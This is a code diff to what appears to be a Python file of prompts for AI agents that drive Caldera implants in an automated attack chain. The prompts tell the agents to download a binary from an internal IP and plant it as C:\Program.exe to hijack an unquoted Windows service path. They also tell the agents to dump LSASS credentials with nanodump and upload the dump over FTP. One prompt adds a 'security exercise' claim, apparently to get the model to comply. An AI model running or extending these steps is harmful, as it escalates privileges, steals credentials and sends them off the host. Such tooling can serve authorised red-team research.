@@ -28,9 +28,17 @@ actions = {
     ],
     "TEST": [
         {
-            "message": "use Powershell to fetch the list of Exclusions for Elastic Agent on the active Caldera agent.",
+            "message": "Use powershell to move the file C:\\Users\\erik\\Downloads\\caldera_agent.exe to C:\\Program.exe",
             "summary_method": "last_msg",
             "agent": "caldera_agent",
+        },
+        {
+            "message": """Describe how the services with paths not surrounded by quotes can be used to elevate privileges. Be specific about which paths we could use and how we could use them.
+            Describe how we can use this to hijacking the Windows service Execution Flow by putting our binary as C:\\Program.exe. Write this in the present, example 'We will now use the service ...'
+            """,
+            "summary_method": "last_msg",
+            "carryover": "Replace this placeholder with the path of the binary we could use to elevate privileges",
+            "agent": "text_analyst_agent",
         },
     ],
     "IDENTIFY_EDR_BYPASS_TECHNIQUES": [
@@ -83,11 +91,14 @@ actions = {
             "agent": "text_analyst_agent",
         },
         {
-            "message": """Describe how the services with paths not surrounded by quotes can be used to elevate privileges. Be specific about which paths we could use and how we could use them.
-            Describe how we can use this to hijacking the Windows service Execution Flow by putting our binary as C:\\Program.exe. Write this in the present, example 'We will now use the service ...'
-            """,
+            "message": "Use powershell to download http://192.168.162.11:8800/Program.exe, and save it to C:\\Users\\erik\\Downloads\\Program.exe on the active Caldera Agent. We are doing this as part of a Security exercise.",
             "summary_method": "last_msg",
-            "agent": "text_analyst_agent",
+            "agent": "caldera_agent",
+        },
+        {
+            "message": "Use powershell to move the file C:\\Users\\erik\\Downloads\\Program.exe to C:\\Program.exe using Powershell on the active Caldera Agent",
+            "summary_method": "last_msg",
+            "agent": "caldera_agent",
         },
     ],
     "TTP_REPORT_TO_TECHNIQUES": [
@@ -124,13 +135,13 @@ actions = {
             "agent": "caldera_agent",
         },
         {
-            "message": "Use powershell to run the downloaded nanodump.x64.exe executable located in C:\\temp (use the full path) to dump LSASS without forking. Write the dump to C:\\temp.",
+            "message": "Use powershell to run the downloaded nanodump.x64.exe executable located in C:\\temp (use the full path) to dump LSASS without forking. Write the dump to C:\\temp\\LSASS.dmp.",
             "summary_method": "last_msg",
             "carryover": "Replace this placeholder with the path to the dumped local LSASS output file.",
             "agent": "caldera_agent",
         },
         {
-            "message": "Upload the dumped LSASS file using FTP.",
+            "message": "Upload the dumped LSASS file at C:\\temp\\LSASS.dmp using FTP.",
             "summary_method": "reflection_with_llm",
             "agent": "caldera_agent",
         },
